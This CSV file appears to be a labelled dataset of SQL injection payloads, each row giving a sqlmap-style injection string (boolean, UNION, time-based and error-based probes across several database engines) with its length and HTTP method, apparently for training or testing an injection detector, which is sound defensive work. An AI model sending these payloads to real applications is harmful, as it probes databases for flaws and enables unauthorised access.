sentence,attack_type,len_payload,http_method
"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and ""onsd"" like ""onsd",1,142,POST
"1"" procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1,121,POST
"1"" rlike  ( select  ( case when  ( 2724 = 4757 )  then 1 else 0x28 end  )  )   and ""cmsa"" = ""cmsa",1,97,GET
"1"" rlike  ( select  ( case when  ( 3711 = 3313 )  then 1 else 0x28 end  )  )   and ""iqlh"" like ""iqlh",1,100,POST
"1"" rlike  ( select  ( case when  ( 5552 = 1712 )  then 1 else 0x28 end  )  )  ",1,76,POST
"1"" rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  ",1,76,GET
"1"" rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and ""qfhv"" = ""qfhv",1,97,GET
"1"" rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and ""tbbk"" like ""tbbk",1,100,GET
"1"" rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) ",1,64,POST
"1"" rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and ""cxsu"" like ""cxsu",1,87,POST
"1"" rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and ""wcze"" = ""wcze",1,84,GET
"1"" rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #",1,66,POST
"1"" rlike sleep ( 5 ) ",1,20,POST
"1"" rlike sleep ( 5 )  and ""rylv"" like ""rylv",1,43,GET
"1"" rlike sleep ( 5 )  and ""veub"" = ""veub",1,40,GET
"1"" rlike sleep ( 5 ) #",1,22,GET
"1"" union all select null--",1,26,POST
"1"" union all select null#",1,25,POST
"1"" union all select null,null--",1,31,GET
"1"" union all select null,null#",1,30,POST
"1"" union all select null,null,null--",1,36,POST
"1"" union all select null,null,null#",1,35,GET
"1"" union all select null,null,null,null--",1,41,GET
"1"" union all select null,null,null,null#",1,40,GET
"1"" union all select null,null,null,null,null--",1,46,POST
"1"" union all select null,null,null,null,null#",1,45,POST
"1"" union all select null,null,null,null,null,null--",1,51,GET
"1"" union all select null,null,null,null,null,null#",1,50,POST
"1"" union all select null,null,null,null,null,null,null--",1,56,POST
"1"" union all select null,null,null,null,null,null,null#",1,55,GET
"1"" union all select null,null,null,null,null,null,null,null--",1,61,GET
"1"" union all select null,null,null,null,null,null,null,null#",1,60,GET
"1"" union all select null,null,null,null,null,null,null,null,null--",1,66,POST
"1"" union all select null,null,null,null,null,null,null,null,null#",1,65,POST
"1"" union all select null,null,null,null,null,null,null,null,null,null--",1,71,GET
"1"" union all select null,null,null,null,null,null,null,null,null,null#",1,70,POST
"1"" waitfor delay '0:0:5'",1,24,POST
"1"" waitfor delay '0:0:5'--",1,26,GET
"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",1,46,GET
"1"" waitfor delay '0:0:5' and ""syhx"" = ""syhx",1,43,GET
"1"" where 1051 = 1051 union all select null--",1,44,POST
"1"" where 1100 = 1100",1,20,POST
"1"" where 1115 = 1115 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,104,GET
"1"" where 1132 = 1132 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --",1,73,POST
"1"" where 1140 = 1140 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,137,POST
"1"" where 1166 = 1166",1,20,GET
"1"" where 1203 = 1203 union all select null,null,null--",1,54,GET
"1"" where 1234 = 1234",1,20,GET
"1"" where 1386 = 1386",1,20,POST
"1"" where 1452 = 1452 union all select null,null,null,null--",1,59,POST
"1"" where 1537 = 1537 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1,235,GET
"1"" where 1618 = 1618 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,96,POST
"1"" where 1683 = 1683 or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #",1,81,POST
"1"" where 1719 = 1719 and 7533 = 7533--",1,38,GET
"1"" where 1765 = 1765 union all select null,null,null,null,null,null#",1,68,GET
"1"" where 1809 = 1809 and make_set ( 8403 = 8403,8899 ) --",1,57,GET
"1"" where 1831 = 1831 and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #",1,82,POST
"1"" where 1852 = 1852 union all select null,null,null,null,null,null,null,null,null#",1,83,POST
"1"" where 1920 = 1920 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,97,GET
"1"" where 1982 = 1982",1,20,POST
"1"" where 2035 = 2035 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  --",1,78,POST
"1"" where 2072 = 2072 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,118,GET
"1"" where 2131 = 2131 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1,284,GET
"1"" where 2204 = 2204 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1,279,GET
"1"" where 2221 = 2221 and 5318 = 8398--",1,38,POST
"1"" where 2235 = 2235 union all select null,null,null,null,null--",1,64,POST
"1"" where 2309 = 2309 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1,60,GET
"1"" where 2365 = 2365 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,133,POST
"1"" where 2394 = 2394 and 8831 = 8333--",1,38,POST
"1"" where 2403 = 2403 or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,125,GET
"1"" where 2452 = 2452",1,20,GET
"1"" where 2462 = 2462 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,183,GET
"1"" where 2483 = 2483",1,20,POST
"1"" where 2512 = 2512 or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,132,POST
"1"" where 2547 = 2547 or sleep ( 5 ) #",1,37,GET
"1"" where 2619 = 2619 and 2823 = 5100#",1,37,POST
"1"" where 2642 = 2642 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,132,POST
"1"" where 2677 = 2677 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) --",1,83,GET
"1"" where 2878 = 2878 union all select null,null,null,null,null#",1,63,GET
"1"" where 2886 = 2886",1,20,GET
"1"" where 2989 = 2989 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,96,POST
"1"" where 3018 = 3018 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1,118,POST
"1"" where 3080 = 3080 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1,223,GET
"1"" where 3221 = 3221 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) --",1,137,POST
"1"" where 3227 = 3227 waitfor delay '0:0:5'--",1,44,POST
"1"" where 3247 = 3247 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,128,GET
"1"" where 3274 = 3274 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1,234,GET
"1"" where 3318 = 3318",1,20,GET
"1"" where 3329 = 3329 or sleep ( 5 ) --",1,38,POST
"1"" where 3368 = 3368 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,138,POST
"1"" where 3434 = 3434",1,20,GET
"1"" where 3484 = 3484 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,207,POST
"1"" where 3510 = 3510",1,20,POST
"1"" where 3678 = 3678 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1,119,GET
"1"" where 3692 = 3692 union all select null,null--",1,49,GET
"1"" where 3740 = 3740 rlike sleep ( 5 ) #",1,40,GET
"1"" where 3764 = 3764",1,20,POST
"1"" where 3933 = 3933 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1,137,POST
"1"" where 3990 = 3990 and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1,74,GET
"1"" where 4064 = 4064 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1,294,POST
"1"" where 4066 = 4066 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 ) --",1,138,POST
"1"" where 4073 = 4073 rlike  ( select  ( case when  ( 8716 = 4281 )  then 1 else 0x28 end  )  )  --",1,98,GET
"1"" where 4082 = 4082 and elt ( 5699 = 1432,1432 ) --",1,52,GET
"1"" where 4161 = 4161 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,105,GET
"1"" where 4183 = 4183 union all select null,null,null,null,null,null--",1,69,POST
"1"" where 4213 = 4213 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,97,POST
"1"" where 4281 = 4281",1,20,GET
"1"" where 4294 = 4294 and make_set ( 2543 = 7988,7988 ) --",1,57,POST
"1"" where 4298 = 4298 order by 1--",1,33,POST
"1"" where 4319 = 4319",1,20,GET
"1"" where 4345 = 4345 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --",1,283,GET
"1"" where 4366 = 4366 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,118,GET
"1"" where 4445 = 4445 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) --",1,140,POST
"1"" where 4450 = 4450 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,104,POST
"1"" where 4597 = 4597 rlike sleep ( 5 ) --",1,41,GET
"1"" where 4633 = 4633 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1,164,POST
"1"" where 4652 = 4652 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,105,POST
"1"" where 4672 = 4672",1,20,GET
"1"" where 4684 = 4684 union all select null,null,null,null#",1,58,GET
"1"" where 4688 = 4688 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  --",1,77,GET
"1"" where 4808 = 4808 union all select null,null,null,null,null,null,null#",1,73,POST
"1"" where 4978 = 4978 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,183,POST
"1"" where 4991 = 4991 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,163,GET
"1"" where 5039 = 5039 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,207,POST
"1"" where 5062 = 5062",1,20,POST
"1"" where 5098 = 5098 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --",1,285,GET
"1"" where 5216 = 5216 or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,128,GET
"1"" where 5236 = 5236 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,160,GET
"1"" where 5250 = 5250",1,20,POST
"1"" where 5328 = 5328 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1,77,POST
"1"" where 5333 = 5333 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,162,GET
"1"" where 5334 = 5334 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1,160,POST
"1"" where 5353 = 5353 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1,161,POST
"1"" where 5372 = 5372 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,126,GET
"1"" where 5406 = 5406 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  --",1,138,GET
"1"" where 5440 = 5440 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,133,GET
"1"" where 5477 = 5477",1,20,POST
"1"" where 5517 = 5517 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1,293,POST
"1"" where 5552 = 5552 or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,182,GET
"1"" where 5796 = 5796 and sleep ( 5 ) #",1,38,POST
"1"" where 5845 = 5845 and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,129,POST
"1"" where 5927 = 5927",1,20,GET
"1"" where 5977 = 5977",1,20,GET
"1"" where 6004 = 6004",1,20,GET
"1"" where 6023 = 6023",1,20,POST
"1"" where 6111 = 6111 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,129,POST
"1"" where 6179 = 6179",1,20,GET
"1"" where 6200 = 6200 and elt ( 1210 = 1210,sleep ( 5  )  )  --",1,62,POST
"1"" where 6281 = 6281 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,137,POST
"1"" where 6325 = 6325 union all select null,null,null,null,null,null,null,null,null,null#",1,88,GET
"1"" where 6347 = 6347 union all select null,null,null,null,null,null,null,null#",1,78,GET
"1"" where 6352 = 6352",1,20,GET
"1"" where 6501 = 6501",1,20,POST
"1"" where 6686 = 6686 or elt ( 6272 = 6272,sleep ( 5  )  )  --",1,61,POST
"1"" where 6785 = 6785 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,126,GET
"1"" where 6800 = 6800 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1,139,POST
"1"" where 7005 = 7005",1,20,POST
"1"" where 7015 = 7015",1,20,GET
"1"" where 7015 = 7015 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",1,182,GET
"1"" where 7022 = 7022",1,20,GET
"1"" where 7045 = 7045",1,20,POST
"1"" where 7110 = 7110",1,20,POST
"1"" where 7158 = 7158",1,20,GET
"1"" where 7232 = 7232  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1,255,POST
"1"" where 7245 = 7245 and 9198 = 9198--",1,38,POST
"1"" where 7249 = 7249 union all select null,null,null,null,null,null,null,null,null,null--",1,89,GET
"1"" where 7279 = 7279 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1,76,GET
"1"" where 7290 = 7290 union all select null,null,null,null,null,null,null--",1,74,GET
"1"" where 7344 = 7344 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) --",1,85,POST
"1"" where 7371 = 7371 waitfor delay '0:0:5'--",1,44,POST
"1"" where 7380 = 7380 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,125,GET
"1"" where 7599 = 7599",1,20,POST
"1"" where 7631 = 7631 and 4733 = 3439",1,36,POST
"1"" where 7696 = 7696 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --",1,336,GET
"1"" where 7739 = 7739 and sleep ( 5 ) --",1,39,GET
"1"" where 7788 = 7788 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,182,GET
"1"" where 7796 = 7796",1,20,POST
"1"" where 7828 = 7828",1,20,POST
"1"" where 7879 = 7879",1,20,GET
"1"" where 8016 = 8016",1,20,POST
"1"" where 8089 = 8089",1,20,POST
"1"" where 8234 = 8234",1,20,GET
"1"" where 8241 = 8241 union all select null,null,null#",1,53,GET
"1"" where 8333 = 8333",1,20,GET
"1"" where 8379 = 8379 and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,138,POST
"1"" where 8387 = 8387",1,20,POST
"1"" where 8483 = 8483 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,208,GET
"1"" where 8571 = 8571",1,20,POST
"1"" where 8635 = 8635 and 4595 = 4595#",1,37,POST
"1"" where 8672 = 8672 union all select null,null#",1,48,GET
"1"" where 8697 = 8697 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,61,GET
"1"" where 8727 = 8727",1,20,GET
"1"" where 8732 = 8732",1,20,POST
"1"" where 8734 = 8734",1,20,POST
"1"" where 8918 = 8918  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) --",1,288,GET
"1"" where 8978 = 8978 union all select null,null,null,null,null,null,null,null--",1,79,POST
"1"" where 9014 = 9014 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --",1,74,POST
"1"" where 9083 = 9083 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1,224,GET
"1"" where 9135 = 9135 and elt ( 4249 = 4249,7259 ) --",1,52,GET
"1"" where 9172 = 9172 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1,269,GET
"1"" where 9173 = 9173 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --",1,98,POST
"1"" where 9230 = 9230",1,20,POST
"1"" where 9241 = 9241 union all select null#",1,43,GET
"1"" where 9332 = 9332 union all select null,null,null,null,null,null,null,null,null--",1,84,POST
"1"" where 9341 = 9341",1,20,POST
"1"" where 9342 = 9342 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1,126,GET
"1"" where 9461 = 9461",1,20,GET
"1"" where 9521 = 9521 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) --",1,82,GET
"1"" where 9618 = 9618 and  ( 3020 = 3020 ) *6703--",1,49,POST
"1"" where 9632 = 9632 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1,270,POST
"1"" where 9669 = 9669",1,20,GET
"1"" where 9725 = 9725",1,20,POST
"1"" where 9756 = 9756",1,20,POST
"1"" where 9760 = 9760 or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --",1,73,GET
"1"" where 9792 = 9792 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #",1,84,GET
"1"" where 9804 = 9804 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,204,GET
"1"" where 9829 = 9829 order by 1#",1,32,POST
"1"" where 9889 = 9889",1,20,POST
"1"" where 9901 = 9901 and  ( 2455 = 8499 ) *8499--",1,49,GET
"1"" where 9919 = 9919",1,20,POST
